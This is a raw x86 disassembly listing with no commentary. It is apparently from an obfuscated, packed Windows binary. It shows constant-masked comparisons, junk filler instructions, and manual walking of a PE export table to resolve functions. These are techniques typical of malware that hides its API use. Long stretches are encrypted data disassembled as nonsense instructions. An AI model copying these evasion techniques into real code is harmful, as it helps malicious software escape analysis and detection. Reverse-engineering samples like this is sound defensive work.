  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
  40cccb:	xor    eax,0x7510854
  40ccd0:	add    eax,0x32729b
  40ccd5:	leave  
  40ccd6:	ret    0x4
  40ccd9:	push   ebp
  40ccda:	mov    ebp,esp
  40ccdc:	mov    eax,ds:0x41222c
  40cce1:	mov    edx,0x32729b
  40cce6:	sub    eax,edx
  40cce8:	mov    ecx,0x7510854
  40cced:	push   esi
  40ccee:	inc    esi
  40ccef:	mov    esi,DWORD PTR [ebp+0xc]
  40ccf2:	or     DWORD PTR ds:0x42e64c,0x4ea0
  40ccfc:	xor    eax,ecx
  40ccfe:	cmp    eax,esi
  40cd00:	mov    DWORD PTR ds:0x430357,0x1f44
  40cd0a:	je     0x40cda9
  40cd10:	mov    esi,DWORD PTR ds:0x42ecd9
  40cd16:	mov    eax,ds:0x4302fd
  40cd1b:	sub    esi,eax
  40cd1d:	imul   esi,DWORD PTR [esi+eax*1]
  40cd21:	mov    eax,ds:0x412224
  40cd26:	and    esi,DWORD PTR ds:0x42ec57
  40cd2c:	mov    esi,DWORD PTR [ebp+0xc]
  40cd2f:	sub    eax,edx
  40cd31:	sbb    DWORD PTR ds:0x4302ed,0x6758
  40cd3b:	xor    eax,ecx
  40cd3d:	mov    DWORD PTR ds:0x430367,0x7cb5
  40cd47:	cmp    eax,esi
  40cd49:	mov    DWORD PTR ds:0x42e640,0x28eb
  40cd53:	jne    0x40cd7d
  40cd59:	mov    eax,ds:0x41222c
  40cd5e:	xor    DWORD PTR ds:0x4302f1,0x42ec4f
  40cd68:	add    eax,DWORD PTR ds:0x412224
  40cd6e:	mov    DWORD PTR ds:0x4302b9,0x6115
  40cd78:	jmp    0x40cd93
  40cd7d:	sbb    eax,0x6db0
  40cd82:	mov    eax,DWORD PTR [ebp+0xc]
  40cd85:	adc    DWORD PTR ds:0x4302bd,0x4302c9
  40cd8f:	xor    eax,ecx
  40cd91:	add    eax,edx
  40cd93:	mov    ds:0x412224,eax
  40cd98:	mov    eax,DWORD PTR [ebp+0xc]
  40cd9b:	xor    eax,ecx
  40cd9d:	add    eax,edx
  40cd9f:	mov    ds:0x41222c,eax
  40cda4:	jmp    0x40cdb3
  40cda9:	mov    eax,ds:0x41222c
  40cdae:	mov    ds:0x412224,eax
  40cdb3:	mov    eax,DWORD PTR [ebp+0x8]
  40cdb6:	mov    eax,DWORD PTR [eax]
  40cdb8:	mov    ecx,DWORD PTR ds:0x412224
  40cdbe:	add    DWORD PTR [eax],ecx
  40cdc0:	pop    esi
  40cdc1:	pop    ebp
  40cdc2:	ret    0x8
  40cdc5:	push   ebp
  40cdc6:	mov    ebp,esp
  40cdc8:	sub    esp,0x30
  40cdcb:	sbb    eax,DWORD PTR ds:0x42ec4b
  40cdd1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cdd8:	and    DWORD PTR ds:0x4302c9,0x0
  40cde2:	mov    eax,ds:0x4302c9
  40cde7:	inc    eax
  40cde8:	mov    ds:0x4302c9,eax
  40cded:	cmp    DWORD PTR ds:0x4302c9,0x18
  40cdf4:	jne    0x40ce06
  40cdfa:	push   DWORD PTR [ebp-0x10]
  40cdfd:	push   DWORD PTR [ebp-0x1c]
  40ce00:	call   DWORD PTR ds:0x42e94f
  40ce06:	cmp    DWORD PTR ds:0x4302c9,0x13
  40ce0d:	jb     0x40cde2
  40ce13:	adc    DWORD PTR ds:0x42ec57,0x4965
  40ce1d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40ce24:	mov    ecx,DWORD PTR [ebp-0x4]
  40ce27:	sub    DWORD PTR ds:0x43034f,0x97c
  40ce31:	push   ebx
  40ce32:	adc    ebx,eax
  40ce34:	mov    eax,0x7510854
  40ce39:	xor    ecx,eax
  40ce3b:	add    ebx,0x6e38
  40ce41:	mov    ebx,0x32729b
  40ce46:	add    ecx,ebx
  40ce48:	mov    DWORD PTR [ebp-0x1c],ecx
  40ce4b:	and    ecx,0x1130
  40ce51:	mov    ecx,DWORD PTR [ebp+0x14]
  40ce54:	sub    DWORD PTR ds:0x42ec63,0x43035f
  40ce5e:	push   esi
  40ce5f:	push   edi
  40ce60:	test   ecx,ecx
  40ce62:	mov    DWORD PTR ds:0x42e64c,0x9d3
  40ce6c:	je     0x40cf83
  40ce72:	mov    DWORD PTR ds:0x4302bd,0x17
  40ce7c:	cmp    DWORD PTR ds:0x4302bd,0x0
  40ce83:	je     0x40cf64
  40ce89:	cmp    DWORD PTR ds:0x4302bd,0x5
  40ce90:	jne    0x40ced0
  40ce96:	push   0x56ae
  40ce9b:	push   DWORD PTR [ebp-0x28]
  40ce9e:	push   0x17dc
  40cea3:	push   0x51d4
  40cea8:	push   DWORD PTR [ebp-0x28]
  40ceab:	push   0x8ee9
  40ceb0:	push   DWORD PTR [ebp-0x1c]
  40ceb3:	push   0x10f5
  40ceb8:	push   DWORD PTR [ebp-0x18]
  40cebb:	push   0x42e65c
  40cec0:	push   0x42e763
  40cec5:	push   0x4a36
  40ceca:	call   DWORD PTR ds:0x42eac3
  40ced0:	cmp    DWORD PTR ds:0x4302bd,0x6
  40ced7:	jne    0x40ceea
  40cedd:	mov    edi,DWORD PTR ds:0x4302bd
  40cee3:	dec    edi
  40cee4:	mov    DWORD PTR ds:0x4302bd,edi
  40ceea:	mov    edi,DWORD PTR ds:0x4302bd
  40cef0:	dec    edi
  40cef1:	mov    DWORD PTR ds:0x4302bd,edi
  40cef7:	jmp    0x40ce7c
  40cefc:	mov    DWORD PTR ds:0x42e654,0x14
  40cf06:	cmp    DWORD PTR ds:0x42e654,0x0
  40cf0d:	je     0x40cf64
  40cf13:	cmp    DWORD PTR ds:0x42e654,0x5
  40cf1a:	jne    0x40cf36
  40cf20:	push   DWORD PTR [ebp-0x28]
  40cf23:	push   0x4302cd
  40cf28:	push   DWORD PTR [ebp-0x24]
  40cf2b:	push   0x3dba
  40cf30:	call   DWORD PTR ds:0x42eac7
  40cf36:	cmp    DWORD PTR ds:0x42e654,0x6
  40cf3d:	jne    0x40cf50
  40cf43:	mov    esi,DWORD PTR ds:0x42e654
  40cf49:	dec    esi
  40cf4a:	mov    DWORD PTR ds:0x42e654,esi
  40cf50:	mov    esi,DWORD PTR ds:0x42e654
  40cf56:	dec    esi
  40cf57:	mov    DWORD PTR ds:0x42e654,esi
  40cf5d:	jmp    0x40cf06
  40cf62:	add    edi,ecx
  40cf64:	mov    ecx,DWORD PTR [ebp+0x14]
  40cf67:	xor    DWORD PTR ds:0x42ec6f,0x2c6d
  40cf71:	mov    ecx,DWORD PTR [ecx]
  40cf73:	movzx  edi,BYTE PTR ds:0x42e644
  40cf7a:	sbb    DWORD PTR ds:0x4302b5,edi
  40cf80:	mov    DWORD PTR [ebp-0x1c],ecx
  40cf83:	imul   edx,eax
  40cf86:	mov    ecx,0x4573
  40cf8b:	mov    DWORD PTR ds:0x43035b,0x1f
  40cf95:	cmp    DWORD PTR ds:0x43035b,0x0
  40cf9c:	je     0x40cfed
  40cfa2:	cmp    DWORD PTR ds:0x43035b,0x9
  40cfa9:	jne    0x40cfbd
  40cfaf:	push   0x42ec5b
  40cfb4:	push   DWORD PTR [ebp-0x1c]
  40cfb7:	call   DWORD PTR ds:0x42e88f
  40cfbd:	cmp    DWORD PTR ds:0x43035b,0xa
  40cfc4:	jne    0x40cfd7
  40cfca:	mov    esi,DWORD PTR ds:0x43035b
  40cfd0:	dec    esi
  40cfd1:	mov    DWORD PTR ds:0x43035b,esi
  40cfd7:	xor    esi,esi
  40cfd9:	or     esi,DWORD PTR ds:0x43035b
  40cfdf:	dec    esi
  40cfe0:	mov    DWORD PTR ds:0x43035b,esi
  40cfe6:	jmp    0x40cf95
  40cfeb:	add    esi,edi
  40cfed:	add    edx,ecx
  40cfef:	mov    DWORD PTR ds:0x42ec73,0x11
  40cff9:	cmp    DWORD PTR ds:0x42ec73,0x0
  40d000:	je     0x40d094
  40d006:	cmp    DWORD PTR ds:0x42ec73,0x3
  40d00d:	jne    0x40d024
  40d013:	push   DWORD PTR [ebp-0x18]
  40d016:	push   0x42e658
  40d01b:	push   DWORD PTR [ebp-0x18]
  40d01e:	call   DWORD PTR ds:0x42eacb
  40d024:	cmp    DWORD PTR ds:0x42ec73,0x4
  40d02b:	jne    0x40d03e
  40d031:	mov    esi,DWORD PTR ds:0x42ec73
  40d037:	dec    esi
  40d038:	mov    DWORD PTR ds:0x42ec73,esi
  40d03e:	mov    esi,DWORD PTR ds:0x42ec73
  40d044:	dec    esi
  40d045:	mov    DWORD PTR ds:0x42ec73,esi
  40d04b:	jmp    0x40cff9
  40d050:	and    DWORD PTR ds:0x4302b9,0x0
  40d05a:	mov    esi,DWORD PTR ds:0x4302b9
  40d060:	inc    esi
  40d061:	mov    DWORD PTR ds:0x4302b9,esi
  40d067:	cmp    DWORD PTR ds:0x4302b9,0x23
  40d06e:	jne    0x40d087
  40d074:	push   0x4365
  40d079:	push   0x641d
  40d07e:	push   DWORD PTR [ebp-0xc]
  40d081:	call   DWORD PTR ds:0x42e893
  40d087:	cmp    DWORD PTR ds:0x4302b9,0x19
  40d08e:	jb     0x40d05a
  40d094:	mov    esi,0x7879
  40d099:	mov    edi,DWORD PTR ds:0x42ec5b
  40d09f:	sub    DWORD PTR ds:0x42e63c,edi
  40d0a5:	mov    edi,0x1556
  40d0aa:	xchg   esi,ecx
  40d0ac:	mov    ecx,DWORD PTR ds:0x42ec5f
  40d0b2:	xor    DWORD PTR ds:0x42ec67,ecx
  40d0b8:	sub    edx,edi
  40d0ba:	xor    esi,esi
  40d0bc:	movzx  ecx,WORD PTR ds:0x42e654
  40d0c3:	or     DWORD PTR ds:0x4302c1,ecx
  40d0c9:	mov    DWORD PTR [ebp-0x28],esi
  40d0cc:	or     ecx,DWORD PTR ds:0x42ec73
  40d0d2:	mov    DWORD PTR [ebp-0x2c],esi
  40d0d5:	sbb    DWORD PTR ds:0x4302cd,ebx
  40d0db:	mov    DWORD PTR [ebp-0x14],esi
  40d0de:	or     DWORD PTR ds:0x42ec5b,ebx
  40d0e4:	mov    DWORD PTR [ebp-0x8],esi
  40d0e7:	mov    ecx,DWORD PTR ds:0x43036b
  40d0ed:	xor    DWORD PTR ds:0x42ec5f,ecx
  40d0f3:	mov    ecx,DWORD PTR [ebp-0x18]
  40d0f6:	xor    ecx,eax
  40d0f8:	xor    DWORD PTR ds:0x42ec57,0x70e3
  40d102:	xor    edi,edi
  40d104:	movzx  eax,BYTE PTR ds:0x42ec4f
  40d10b:	or     DWORD PTR ds:0x42ec5b,eax
  40d111:	jmp    0x40d25a
  40d116:	adc    al,0xe1
  40d118:	addr16 jp 0x40d18e
  40d11b:	clc    
  40d11c:	jno    0x40d10f
  40d11e:	inc    ebx
  40d11f:	xor    bl,al
  40d121:	xor    DWORD PTR [edi-0x60ea22d],eax
  40d127:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f22
  40d12e:	out    dx,eax
  40d12f:	xchg   ecx,eax
  40d130:	pminsw mm3,QWORD PTR ds:0xc905dd3d
  40d137:	pop    ecx
  40d138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d139:	adc    edi,DWORD PTR [eax+0x55]
  40d13c:	push   edi
  40d13d:	sub    eax,0x9dadda6c
  40d142:	mov    dh,0x93
  40d144:	mov    bh,0x8f
  40d146:	in     al,0x10
  40d148:	(bad)  
  40d149:	lock mov DWORD PTR fs:[esi],eax
  40d14d:	mov    ecx,0x737875a
  40d152:	adc    BYTE PTR [edi],bh
  40d154:	scas   eax,DWORD PTR es:[edi]
  40d155:	enter  0xdfa3,0xf4
  40d159:	mov    ebx,0xdaaeec70
  40d15e:	mov    ?,WORD PTR ds:0xa499bf11
  40d164:	out    0xce,eax
  40d166:	lods   al,BYTE PTR ds:[esi]
  40d167:	(bad)  
  40d168:	mov    esi,0xd3962847
  40d16d:	test   eax,0x8b30f825
  40d172:	stc    
  40d173:	out    dx,eax
  40d174:	add    bl,ch
  40d176:	push   ebx
  40d177:	shl    BYTE PTR [ecx+0x713c601b],cl
  40d17d:	addr16 dec eax
  40d17f:	xchg   ebx,eax
  40d180:	imul   edx,DWORD PTR [eax+0x60b17e17],0x73
  40d187:	out    dx,al
  40d188:	push   ecx
  40d189:	es sbb eax,0x818c2ff3
  40d18f:	dec    eax
  40d190:	outs   dx,BYTE PTR cs:[esi]
  40d192:	mov    dh,0xa9
  40d194:	xchg   ebx,eax
  40d195:	int3   
  40d196:	adc    eax,0x78b74187
  40d19b:	add    DWORD PTR [edx+0x27],0xb6d56154
  40d1a2:	push   0xc7aadaf2
  40d1a7:	sub    dh,BYTE PTR [esi-0x80]
  40d1aa:	sti    
  40d1ab:	or     DWORD PTR [eax-0x3d9e1cfc],eax
  40d1b1:	arpl   WORD PTR [ebp-0x7b],cx
  40d1b4:	xchg   edx,eax
  40d1b5:	add    DWORD PTR [ebx],0xffffff8f
  40d1b8:	jle    0x40d1fe
  40d1ba:	pop    edi
  40d1bb:	pop    esp
  40d1bc:	mov    DWORD PTR [ebx-0x26f92c4d],edx
  40d1c2:	stc    
  40d1c3:	aas    
  40d1c4:	sbb    al,0x65
  40d1c6:	or     BYTE PTR [esi+0x43],bh
  40d1c9:	and    eax,0xb4036ed0
  40d1ce:	push   es
  40d1cf:	popa   
  40d1d0:	cdq    
  40d1d1:	adc    eax,ebp
  40d1d3:	or     DWORD PTR [ebp-0x15fce4f8],edi
  40d1d9:	out    0x60,al
  40d1db:	iret   
  40d1dc:	sbb    al,BYTE PTR [edx-0x16b2fdd7]
  40d1e2:	lods   eax,DWORD PTR ds:[esi]
  40d1e3:	js     0x40d254
  40d1e5:	mov    ebx,0x6ceeb23c
  40d1ea:	jns    0x40d188
  40d1ec:	pop    ebp
  40d1ed:	mov    WORD PTR [ebp+0x715c6eb5],fs
  40d1f3:	nop
  40d1f4:	test   eax,0xff094422
  40d1f9:	inc    ecx
  40d1fa:	in     eax,0x7f
  40d1fc:	add    cl,al
  40d1fe:	sub    BYTE PTR [ebx+0x3fd22446],dh
  40d204:	xchg   edx,eax
  40d205:	div    DWORD PTR [ecx+0x652a6bf5]
  40d20b:	cmp    ch,al
  40d20d:	daa    
  40d20e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d20f:	cmp    BYTE PTR [esi],bl
  40d211:	add    al,0xa
  40d213:	into   
  40d214:	jle    0x40d22b
  40d216:	and    bh,al
  40d218:	cmp    al,0xd1
  40d21a:	mov    al,ds:0xe67bae34
  40d21f:	inc    esi
  40d220:	sub    cl,al
  40d222:	fstp   st(3)
  40d224:	adc    al,0xe
  40d226:	in     al,0x69
  40d228:	add    eax,0x45a43c4f
  40d22d:	mov    cl,0xf0
  40d22f:	dec    DWORD PTR [ecx+0x32]
  40d232:	cmp    bh,dl
  40d234:	jnp    0x40d1b8
  40d236:	sub    BYTE PTR [ebp*8-0x1d970e1],ch
  40d23d:	mov    BYTE PTR [ebx],dh
  40d23f:	sahf   
  40d240:	popa   
  40d241:	cmp    dh,BYTE PTR [edx]
  40d243:	out    0x73,al
  40d245:	div    esi
  40d247:	or     al,0x9f
  40d249:	fdivr  st,st(6)
  40d24b:	push   esp
  40d24c:	mov    edi,0xa8277b1b
  40d251:	dec    eax
  40d252:	xchg   ecx,eax
  40d253:	jns    0x40d1dd
  40d255:	test   DWORD PTR [edi],0x3d53b59
  40d25b:	retf   
  40d25c:	mov    DWORD PTR [ebp-0x20],ecx
  40d25f:	mov    eax,ds:0x430367
  40d264:	mov    eax,DWORD PTR [ebp-0x20]
  40d267:	je     0x40d591
  40d26d:	mov    eax,DWORD PTR [ebp-0x4]
  40d270:	and    DWORD PTR ds:0x42ec67,0x42e644
  40d27a:	xor    eax,0x7510854
  40d27f:	or     DWORD PTR ds:0x42ec6f,0x3ff6
  40d289:	add    eax,ebx
  40d28b:	mov    DWORD PTR ds:0x42ec5f,0x774f
  40d295:	cmp    edi,eax
  40d297:	mov    DWORD PTR ds:0x42ec57,0x9b6
  40d2a1:	jne    0x40d3eb
  40d2a7:	push   DWORD PTR [ebp+0x8]
  40d2aa:	sub    DWORD PTR ds:0x4302b9,0x4302c5
  40d2b4:	call   0x40cbbb
  40d2b9:	mov    ecx,DWORD PTR ds:0x43035f
  40d2bf:	add    DWORD PTR ds:0x42ec57,ecx
  40d2c5:	mov    DWORD PTR [ebp-0x20],eax
  40d2c8:	add    ecx,ecx
  40d2ca:	mov    eax,DWORD PTR [ebp-0x4]
  40d2cd:	mov    ecx,DWORD PTR [ebp-0x20]
  40d2d0:	mov    esi,DWORD PTR ds:0x42e7ef
  40d2d6:	mov    esi,DWORD PTR [esi]
  40d2d8:	and    DWORD PTR ds:0x4302e5,esi
  40d2de:	mov    esi,0x7510854
  40d2e3:	sub    DWORD PTR ds:0x4302dd,0x42ec53
  40d2ed:	xor    eax,esi
  40d2ef:	add    eax,ebx
  40d2f1:	mov    DWORD PTR ds:0x42e644,0x6de1
  40d2fb:	cmp    ecx,eax
  40d2fd:	mov    DWORD PTR ds:0x4302c9,0x4fd
  40d307:	je     0x40d575
  40d30d:	sbb    DWORD PTR ds:0x4302e5,0x4302bd
  40d317:	push   DWORD PTR [ebp-0x20]
  40d31a:	push   DWORD PTR [ebp+0x8]
  40d31d:	mov    DWORD PTR ds:0x42e644,0x2d65
  40d327:	call   0x4041b8
  40d32c:	xor    DWORD PTR ds:0x42ec6b,0x6710
  40d336:	mov    DWORD PTR [ebp-0x14],eax
  40d339:	or     DWORD PTR ds:0x4302c9,0x430353
  40d343:	mov    eax,DWORD PTR [ebp-0x4]
  40d346:	adc    DWORD PTR ds:0x4302b5,0x2fc0
  40d350:	mov    ecx,DWORD PTR [ebp-0x14]
  40d353:	add    DWORD PTR ds:0x4302cd,0x5a83
  40d35d:	xor    eax,esi
  40d35f:	add    eax,ebx
  40d361:	mov    DWORD PTR ds:0x4302e1,0x3b14
  40d36b:	cmp    ecx,eax
  40d36d:	je     0x40d575
  40d373:	mov    eax,DWORD PTR [ebp-0x14]
  40d376:	and    DWORD PTR ds:0x4302dd,0x0
  40d380:	mov    ecx,DWORD PTR ds:0x4302dd
  40d386:	inc    ecx
  40d387:	mov    DWORD PTR ds:0x4302dd,ecx
  40d38d:	cmp    DWORD PTR ds:0x4302dd,0x1d
  40d394:	jne    0x40d3b2
  40d39a:	push   0x4302c1
  40d39f:	push   0x883a
  40d3a4:	push   0x157c
  40d3a9:	push   DWORD PTR [ebp-0x28]
  40d3ac:	call   DWORD PTR ds:0x42e953
  40d3b2:	cmp    DWORD PTR ds:0x4302dd,0x18
  40d3b9:	jb     0x40d380
  40d3bf:	mov    eax,DWORD PTR [eax+0x18]
  40d3c2:	mov    DWORD PTR [ebp-0x20],eax
  40d3c5:	mov    eax,DWORD PTR [ebp-0x14]
  40d3c8:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3cb:	add    ecx,DWORD PTR [eax+0x20]
  40d3ce:	mov    DWORD PTR [ebp-0x28],ecx
  40d3d1:	mov    eax,DWORD PTR [ebp-0x14]
  40d3d4:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3d7:	add    ecx,DWORD PTR [eax+0x24]
  40d3da:	mov    DWORD PTR [ebp-0x2c],ecx
  40d3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40d3e0:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3e3:	add    ecx,DWORD PTR [eax+0x1c]
  40d3e6:	xor    esi,esi
  40d3e8:	mov    DWORD PTR [ebp-0x14],ecx
  40d3eb:	mov    eax,DWORD PTR [ebp-0x28]
  40d3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40d3f1:	add    ecx,DWORD PTR [eax+edi*4]
  40d3f4:	lea    eax,[ebp-0x8]
  40d3f7:	mov    DWORD PTR [ebp-0x30],ecx
  40d3fa:	push   eax
  40d3fb:	push   DWORD PTR [ebp-0x30]
  40d3fe:	jmp    0x40d547
  40d403:	add    al,BYTE PTR [ebx]
  40d405:	in     eax,dx
  40d406:	jecxz  0x40d3f5
  40d408:	icebp  
  40d409:	adc    bl,ah
  40d40b:	push   0xb36a8e30
  40d410:	loopne 0x40d3cb
  40d412:	call   0x7f22:0x7e7e8ead
  40d419:	jle    0x40d499
  40d41b:	stos   DWORD PTR es:[edi],eax
  40d41c:	in     eax,dx
  40d41d:	rcl    BYTE PTR [eax+0xccf7822],cl
  40d423:	cli    
  40d424:	add    DWORD PTR [ebp+ebp*2-0x3c],ebx
  40d428:	aaa    
  40d429:	and    al,0x77
  40d42b:	retf   
  40d42c:	xor    eax,0x66503c0f
  40d431:	(bad)  
  40d432:	cmc    
  40d433:	xchg   ecx,eax
  40d434:	add    edi,edx
  40d436:	mov    dl,0xf2
  40d438:	push   edi
  40d439:	addr16 in al,0xd2
  40d43c:	xlat   BYTE PTR ds:[ebx]
  40d43d:	sbb    bh,BYTE PTR [edi+0x4e784a3c]
  40d443:	jne    0x40d417
  40d445:	and    eax,0x6bc4047d
  40d44a:	cld    
  40d44b:	mov    edx,0x387aec6a
  40d450:	retf   0x2a83
  40d453:	xor    eax,0x38837413
  40d458:	mov    eax,0x67de34fa
  40d45d:	inc    edx
  40d45e:	sbb    dl,cl
  40d460:	cmp    eax,0x72462d42
  40d465:	dec    ebx
  40d466:	stos   DWORD PTR es:[edi],eax
  40d467:	or     cl,bh
  40d469:	cmp    dh,BYTE PTR [esi+0x72]
  40d46c:	lea    ecx,[esi+esi*8-0x59]
  40d470:	rol    edx,1
  40d472:	test   al,0xce
  40d474:	(bad)  
  40d475:	sti    
  40d476:	adc    esp,DWORD PTR [edi+0x3f522d96]
  40d47c:	fcmovbe st,st(5)
  40d47e:	pop    esi
  40d47f:	ss lahf 
  40d481:	daa    
  40d482:	(bad)  
  40d483:	sub    dh,BYTE PTR [ecx+0x5ad169ae]
  40d489:	lds    esp,FWORD PTR [ebx+0x71]
  40d48c:	shl    DWORD PTR [edi],0xae
  40d48f:	mov    ecx,0x9859f21e
  40d494:	cmp    ebp,esp
  40d496:	cdq    
  40d497:	das    
  40d498:	pop    ebx
  40d499:	or     eax,0x4b66c2d4
  40d49e:	js     0x40d454
  40d4a0:	inc    eax
  40d4a1:	lds    edx,FWORD PTR [esi+eax*8+0x2a]
  40d4a5:	ss (bad) 
  40d4a7:	pop    ss
  40d4a8:	jl     0x40d51d
  40d4aa:	int    0xaf
  40d4ac:	lea    edx,[ebx+0x14b6cc1c]
  40d4b2:	inc    ebx
  40d4b3:	repnz adc al,0x2f
  40d4b6:	adc    al,0x8a
  40d4b8:	scas   al,BYTE PTR es:[edi]
  40d4b9:	in     al,0x7f
  40d4bb:	out    dx,eax
  40d4bc:	retf   
  40d4bd:	pop    edi
  40d4be:	ins    DWORD PTR es:[edi],dx
  40d4bf:	and    al,0xa
  40d4c1:	adc    bl,BYTE PTR [eax]
  40d4c3:	and    BYTE PTR [ecx],cl
  40d4c5:	push   esi
  40d4c6:	leave  
  40d4c7:	or     edx,DWORD PTR [eax+0x15]
  40d4ca:	in     eax,dx
  40d4cb:	mov    eax,ds:0xf17e6482
  40d4d0:	mov    ?,edx
  40d4d2:	es (bad) 
  40d4d6:	mov    al,ds:0x4d6bb67c
  40d4db:	mov    eax,0x33968173
  40d4e0:	fdiv   DWORD PTR [edi]
  40d4e2:	into   
  40d4e3:	push   ecx
  40d4e4:	xchg   ecx,eax
  40d4e5:	loope  0x40d4c9
  40d4e7:	out    0xfa,eax
  40d4e9:	stos   BYTE PTR es:[edi],al
  40d4ea:	dec    ebp
  40d4eb:	push   ebx
  40d4ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4ed:	mov    ds:0x2a776a76,al
  40d4f2:	(bad)  
  40d4f3:	xor    cl,bh
  40d4f5:	in     eax,0x1c
  40d4f7:	pop    es
  40d4f8:	xor    bh,al
  40d4fa:	dec    ebp
  40d4fb:	fistp  DWORD PTR [edi+0x74]
  40d4fe:	inc    esp
  40d4ff:	sti    
  40d500:	sti    
  40d501:	mov    esi,0x740b0c71
  40d506:	es (bad) 
  40d508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d509:	das    
  40d50a:	mov    bh,0x21
  40d50c:	ret    
  40d50d:	push   ds
  40d50e:	stos   DWORD PTR es:[edi],eax
  40d50f:	pop    esi
  40d510:	xchg   edi,eax
  40d511:	jnp    0x40d4a3
  40d513:	push   edx
  40d514:	fistp  DWORD PTR [ebx-0x4a2adf1c]
  40d51a:	xchg   bl,dl
  40d51c:	xor    al,0x57
  40d51e:	in     eax,dx
  40d51f:	fstp   QWORD PTR ss:[eax]
  40d522:	or     BYTE PTR [ebx+0x6a],ch
  40d525:	mov    ecx,0xfd8ecbb0
  40d52a:	xor    al,0x66
  40d52c:	mov    edi,0xdf02a8b
  40d531:	mov    ch,0x1e
  40d533:	scas   al,BYTE PTR es:[edi]
  40d534:	(bad)  
  40d535:	out    0xd5,al
  40d537:	adc    ebp,DWORD PTR [edi-0x1eb33538]
  40d53d:	add    ecx,eax
  40d53f:	sahf   
  40d540:	push   es
  40d541:	mov    cl,0xfd
  40d543:	push   0xffffffd5
  40d545:	sub    ch,BYTE PTR [ebp-0x1]
  40d548:	jne    0x40d556
  40d54a:	call   0x402e68
  40d54f:	mov    eax,DWORD PTR [ebp-0x4]
  40d552:	mov    ecx,DWORD PTR [ebp-0x8]
  40d555:	xor    eax,0x7510854
  40d55a:	add    eax,ebx
  40d55c:	cmp    ecx,eax
  40d55e:	jne    0x40d581
  40d564:	mov    eax,DWORD PTR [ebp-0x20]
  40d567:	inc    edi
  40d568:	cmp    edi,eax
  40d56a:	jb     0x40d26d
  40d570:	jmp    0x40d591
  40d575:	mov    eax,DWORD PTR [ebp-0x4]
  40d578:	xor    eax,esi
  40d57a:	add    eax,ebx
  40d57c:	jmp    0x40dfde
  40d581:	mov    eax,DWORD PTR [ebp-0x2c]
  40d584:	movzx  eax,WORD PTR [eax+edi*2]
  40d588:	mov    ecx,DWORD PTR [ebp-0x14]
  40d58b:	mov    eax,DWORD PTR [ecx+eax*4]
  40d58e:	mov    DWORD PTR [ebp+0xc],eax
  40d591:	mov    eax,DWORD PTR [ebp-0x4]
  40d594:	mov    ecx,DWORD PTR [ebp-0x8]
  40d597:	xor    eax,0x7510854
  40d59c:	add    eax,ebx
  40d59e:	cmp    ecx,eax
  40d5a0:	jne    0x40d6fc
  40d5a6:	jmp    0x40d6ef
  40d5ab:	aad    0x5b
  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	cli    
  40d5b8:	sub    BYTE PTR [ebx],0xb
  40d5bb:	push   ecx
  40d5bc:	(bad)  
  40d5bd:	jle    0x40d63d
  40d5bf:	and    bh,BYTE PTR [edi+0x7e]
  40d5c2:	jle    0x40d62d
  40d5c4:	test   eax,0x38f0f677
  40d5c9:	mov    DWORD PTR [edi+0x9],esp
  40d5cc:	xchg   ebx,eax
  40d5cd:	call   0x66f41c68
  40d5d2:	sub    DWORD PTR [ecx],esi
  40d5d4:	test   BYTE PTR [ebx+0x755d6bed],cl
  40d5da:	dec    esi
  40d5db:	mov    bh,BYTE PTR [ecx+0x4bb367c3]
  40d5e1:	cmp    DWORD PTR [edi-0x521c7365],eax
  40d5e7:	xor    al,0x56
  40d5e9:	in     eax,dx
  40d5ea:	lea    edi,[eax-0x5604672c]
  40d5f0:	sbb    al,0x63
  40d5f2:	rcl    BYTE PTR [ebp-0x14d737b1],1
  40d5f8:	mov    ebx,DWORD PTR ds:0x55b9f07a
  40d5fe:	fdiv   QWORD PTR [ebx]
  40d600:	stos   BYTE PTR es:[edi],al
  40d601:	dec    esi
  40d602:	test   al,0xfd
  40d604:	fmul   QWORD PTR [edi]
  40d606:	mov    ah,BYTE PTR [esi-0x25]
  40d609:	pop    es
  40d60a:	cmp    dh,BYTE PTR [edi-0xa51aeb6]
  40d610:	mov    esp,0x5d523400
  40d615:	pop    ss
  40d616:	xor    BYTE PTR [ebp-0x63bbb673],dh
  40d61c:	adc    eax,DWORD PTR [ebx]
  40d61e:	dec    esi
  40d61f:	cmp    ebx,0x467c58f4
  40d625:	add    BYTE PTR [esi],cl
  40d627:	inc    edi
  40d628:	fist   WORD PTR [ebx+0x73048854]
  40d62e:	call   0x177e5ead
  40d633:	or     eax,0xb9c2d5c0
  40d638:	test   DWORD PTR [ecx-0x615ee509],edi
  40d63e:	jae    0x40d641
  40d640:	or     eax,0xf9bd99b6
  40d645:	ja     0x40d688
  40d647:	retf   
  40d648:	lods   al,BYTE PTR ds:[esi]
  40d649:	and    al,0x31
  40d64b:	imul   BYTE PTR [ebx+ecx*8+0x581e870]
  40d652:	sbb    edx,esp
  40d654:	push   ds
  40d655:	jmp    0xd023113f
  40d65a:	ret    
  40d65b:	std    
  40d65c:	rcr    DWORD PTR [eax+0x5c44254],0x18
  40d663:	addr16 test eax,0x803f5595
  40d669:	pop    edx
